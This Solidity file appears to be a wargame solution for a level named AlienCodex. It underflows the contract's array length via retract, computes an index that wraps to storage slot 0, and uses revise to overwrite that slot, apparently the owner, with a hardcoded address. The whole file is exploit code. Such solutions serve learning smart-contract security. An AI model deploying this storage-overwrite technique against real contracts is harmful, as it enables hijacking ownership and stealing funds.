// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AlienCodex {
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}
contract AlienRewrite {
    function rewrite(address _codex) external {
        AlienCodex(_codex).makeContact();
        AlienCodex(_codex).retract();
        uint256 position;
        unchecked {
            uint256 arraySlotInStorage = uint256(
                keccak256(abi.encode(uint256(1)))
            );
            //Find the additive inverse of the cyclic group
            position = 0 - arraySlotInStorage;
        }

                //interesting, bytes32(bytes20(address)) != bytes32(uint256(uint160(address)))
        bytes32 myAddy = bytes32(
            uint256(uint160(0x4cD5CdaA35EB2c7ba1eD027Bc7572F841A1CF66c))
        );


        AlienCodex(_codex).revise(position, myAddy);
    }
}
